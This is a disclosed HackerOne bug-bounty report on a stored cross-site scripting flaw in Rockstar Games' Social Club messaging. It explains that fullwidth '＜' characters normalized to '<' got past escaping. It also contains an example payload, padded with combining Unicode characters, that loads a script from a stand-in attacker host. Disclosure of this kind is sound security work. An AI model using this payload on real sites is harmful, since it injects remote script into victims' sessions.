@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/639684
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/alexbirsan
+ReportedTo:Rockstar Games(rockstargames)
+BountyAmount:1000.0
+Severity:high
+State:Closed
+DateOfDisclosure:24.09.2019 21:40:58
+
+Summary:
+In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website. By taking advantage of the fact that '＜' characters are normalized to '<', as well as discovering improper escaping of the aforementioned '<' character, the researcher was able to craft a payload to perform XSS attacks. 
+
+An example payload:
+
+=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
